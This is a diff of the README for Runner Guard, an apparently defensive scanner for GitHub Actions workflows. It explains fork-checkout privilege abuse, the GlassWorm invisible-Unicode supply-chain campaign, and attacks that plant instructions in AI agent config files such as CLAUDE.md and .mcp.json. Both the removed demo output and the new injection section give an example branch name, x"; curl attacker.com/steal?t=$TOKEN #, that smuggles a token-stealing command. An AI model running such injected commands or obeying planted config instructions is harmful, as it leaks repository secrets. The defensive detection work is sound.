@@ -8,11 +8,21 @@ Runner Guard performs source-to-sink vulnerability scanning (also known as stati
 
 ---
 
-## The Attack Explained
+## The Attacks Explained
+
+### CI/CD Pipeline Injection
 
 GitHub Actions workflows triggered by `pull_request_target` run in the context of the base (target) repository, not the fork. This means they have access to repository secrets, write-scoped GITHUB_TOKEN, and all configured permissions. The trigger exists so maintainers can run trusted operations (labeling, commenting) on incoming PRs. The critical mistake is combining this privileged trigger with `actions/checkout` pointing at the pull request's head -- the fork code. When a workflow does this, every file in the attacker's fork executes with the base repository's full credentials.
 
 The attack chain is straightforward: an attacker forks the target repository, modifies build scripts, test configurations, Makefiles, or package manager hooks to include malicious commands (secret exfiltration, backdoor injection, release tampering), then opens a pull request. The `pull_request_target` workflow checks out the fork code and runs the build. The malicious commands execute with write access to the repository and all its secrets. In documented incidents, attackers exfiltrated Personal Access Tokens to external servers, then used them to push malicious commits directly to main branches -- all within minutes, fully automated by AI agents. The same pattern applies to `issue_comment` triggers where branch names or comment bodies are interpolated into shell commands without sanitization.
+
+### Supply Chain Steganography
+
+In March 2026, the GlassWorm campaign compromised 433+ components across GitHub, npm, and VS Code/OpenVSX using a technique that is invisible to code review: Unicode steganography. Attackers injected invisible characters -- variation selectors, zero-width spaces, tag characters -- into source files. These characters are completely hidden in code editors, terminals, and GitHub's diff viewer, but encode executable payloads that activate during CI/CD pipeline runs.
+
+The decoded ZOMBI module performed credential harvesting, cryptocurrency wallet theft, SOCKS proxy deployment, and used the Solana blockchain for command-and-control. The attack targeted files that CI pipelines trust implicitly: `setup.py`, `package.json`, build scripts, and workflow YAML itself. Because the malicious payload is invisible, standard code review and even `git diff` cannot detect it -- only byte-level scanning reveals the hidden characters.
+
+Runner Guard detects this attack class at the byte level: invisible Unicode in workflow files (RGS-016), in referenced scripts executed by workflows (RGS-017), and known IOC patterns and eval+decode payload techniques in run blocks (RGS-018). Threat signatures are loaded from an updatable `signatures.yaml` embedded in the binary, so new indicators can be added without code changes.
 
 ---
 
@@ -46,70 +56,49 @@ Runner Guard uses a four-stage analysis pipeline:
 
 ---
 
-## Quick Demo
+## Demo Scenarios
 
-![Runner Guard Demo](docs/demo.gif)
+Runner Guard ships with built-in demo scenarios that demonstrate each attack class against realistic vulnerable workflows.
 
-<details>
-<summary>Text output</summary>
+### Fork Checkout Kill Chain
 
-```
-$ runner-guard demo
+![Fork Checkout Demo](docs/demo-fork-checkout.gif)
 
-Runner Guard Demo - Vulnerable Workflow Analysis
-==============================================
+The most common CI/CD pipeline attack: a `pull_request_target` workflow checks out fork code in the privileged base repository context, giving an attacker's build scripts full access to repository secrets. Detects the checkout itself (RGS-001), secret exposure to fork code (RGS-007), unpinned actions vulnerable to tag hijacking (RGS-009), and network exfiltration of secrets (RGS-012).
 
-Scanning: ci-vulnerable.yml (Fork Checkout Kill Chain)
-  CRITICAL  RGS-001  pull_request_target with Fork Code Checkout
-            Line 14: actions/checkout with ref: github.event.pull_request.head.sha
-            Fork code executes in privileged base repo context with secret access.
-
-  HIGH      RGS-007  Secret Exposed to Fork Code Execution
-            Line 20: GITHUB_TOKEN passed to step executing fork-controlled code.
-            Attacker-controlled build scripts can exfiltrate this token.
-
-  HIGH      RGS-009  Unpinned Third-Party Action
-            Line 24: codecov/codecov-action@v3 (mutable tag, not SHA-pinned).
-            Supply-chain risk: tag can be force-pushed to point at malicious code.
-
-  MEDIUM    RGS-012  Network Exfiltration in Privileged Context
-            Line 27: curl to external URL with secret in Authorization header.
-            Secrets can be exfiltrated to attacker-controlled endpoints.
-
-Scanning: comment-trigger.yml (Microsoft/Akri Pattern)
-  CRITICAL  RGS-002  Branch Name Injection via Expression Interpolation
-            Line 13: github.head_ref interpolated directly in run block.
-            Attacker sets branch name to: x"; curl attacker.com/steal?t=$TOKEN #
-
-  HIGH      RGS-004  issue_comment Trigger Without Authorization Check
-            Line 8: No author_association or org membership check.
-            Any GitHub user can trigger this workflow by posting a comment.
-
-  HIGH      RGS-006  Curl Pipe Bash Pattern
-            Line 17: curl ... | bash executes remote code without verification.
-            Compromised or MITM'd URL delivers arbitrary code execution.
-
-  HIGH      RGS-008  Secret in Command-Line Argument
-            Line 21: secrets.DEPLOY_TOKEN passed as CLI argument.
-            Visible in process listing and shell history.
-
-Scanning: ai-config-attack.yml (AI Config Injection)
-  CRITICAL  RGS-001  pull_request_target with Fork Code Checkout
-            Line 14: actions/checkout with ref: github.event.pull_request.head.ref
-            Fork code executes in privileged base repo context with secret access.
-
-  HIGH      RGS-010  AI Agent Configuration File in Fork Checkout
-            Line 17: CLAUDE.md loaded from fork-controlled checkout.
-            Attacker modifies CLAUDE.md to inject malicious instructions into AI agent.
-
-  HIGH      RGS-011  MCP Configuration File in Fork Checkout
-            Line 23: .mcp.json / mcp-config.json read from fork-controlled checkout.
-            Attacker injects malicious MCP server endpoints to hijack AI tooling.
-
-Summary: 11 findings (3 critical, 6 high, 2 medium) across 3 workflows.
+```bash
+runner-guard demo --scenario fork-checkout
 ```
 
-</details>
+### Expression Injection (Microsoft/Akri Pattern)
+
+![Expression Injection Demo](docs/demo-microsoft.gif)
+
+Modeled after the real-world vulnerability in Microsoft's Akri project. An `issue_comment` trigger interpolates attacker-controlled data -- branch names, comment bodies -- directly into shell `run:` blocks without sanitization. An attacker sets a branch name like `x"; curl attacker.com/steal?t=$TOKEN #` and the shell executes it. Detects branch name injection (RGS-002), missing authorization checks (RGS-004), curl-pipe-bash patterns (RGS-006), and secrets in CLI arguments (RGS-008).
+
+```bash
+runner-guard demo --scenario microsoft
+```
+
+### AI Configuration Injection
+
+![AI Config Injection Demo](docs/demo-ai-injection.gif)
+
+A novel attack surface unique to Runner Guard's detection capabilities. When a `pull_request_target` workflow checks out fork code, an attacker can modify AI agent configuration files -- CLAUDE.md, copilot-instructions.md, .cursorrules, .mcp.json -- to inject malicious instructions into AI code review agents running in privileged CI contexts. Detects AI config injection (RGS-010) and MCP config hijacking (RGS-011).
+
+```bash
+runner-guard demo --scenario ai-injection
+```
+
+### GlassWorm Supply Chain Attack
+
+![GlassWorm Detection Demo](docs/glassworm-demo.gif)
+
+Demonstrates detection of the GlassWorm campaign's invisible Unicode steganography technique. The demo workflow contains embedded invisible characters, known malware IOC variables, and dangerous eval+decode patterns -- all techniques used to compromise 433+ components across GitHub, npm, and VS Code/OpenVSX. Detects invisible Unicode in workflow files (RGS-016), known GlassWorm IOCs, and suspicious eval+decode payload patterns (RGS-018).
+
+```bash
+runner-guard demo --scenario glassworm
+```
 
 ---
 
@@ -223,18 +212,6 @@ runner-guard baseline update
 **RGS-010** and **RGS-011** are unique to Runner Guard. No other CI/CD security scanner detects AI configuration injection attacks where an attacker modifies CLAUDE.md, .claude/settings.json, .mcp.json, or mcp-config.json in a fork pull request to hijack AI code review agents running in privileged CI contexts.
 
 **RGS-016**, **RGS-017**, and **RGS-018** detect the GlassWorm supply chain attack and related steganographic techniques. RGS-016 performs byte-level scanning of workflow files for invisible Unicode characters (variation selectors, zero-width chars, tag characters) used to encode hidden payloads. RGS-017 extends this analysis to files referenced and executed by workflows (setup.py, package.json, Dockerfiles, shell scripts). RGS-018 matches known IOC patterns from the GlassWorm campaign and detects dangerous eval+decode execution patterns. Threat signatures are loaded from an embedded `signatures.yaml` that can be updated without code changes.
-
-### GlassWorm Supply Chain Attack
-
-![GlassWorm Detection Demo](docs/glassworm-demo.gif)
-
-In March 2026, the GlassWorm campaign compromised 433+ components across GitHub, npm, and VS Code/OpenVSX by injecting invisible Unicode characters into source files. The decoded ZOMBI module performed credential harvesting, cryptocurrency wallet theft, SOCKS proxy deployment, and used the Solana blockchain for command-and-control — all hidden behind characters that are completely invisible in code editors, terminals, and GitHub's diff viewer.
-
-Runner Guard detects this attack at the byte level: invisible Unicode in workflow files (RGS-016), in referenced scripts like setup.py and package.json (RGS-017), and known GlassWorm IOCs and eval+decode payload patterns in run blocks (RGS-018). IOC patterns are loaded from `signatures.yaml` and can be updated without recompiling.
-
-```bash
-runner-guard demo --scenario glassworm
-```
 
 ---
 
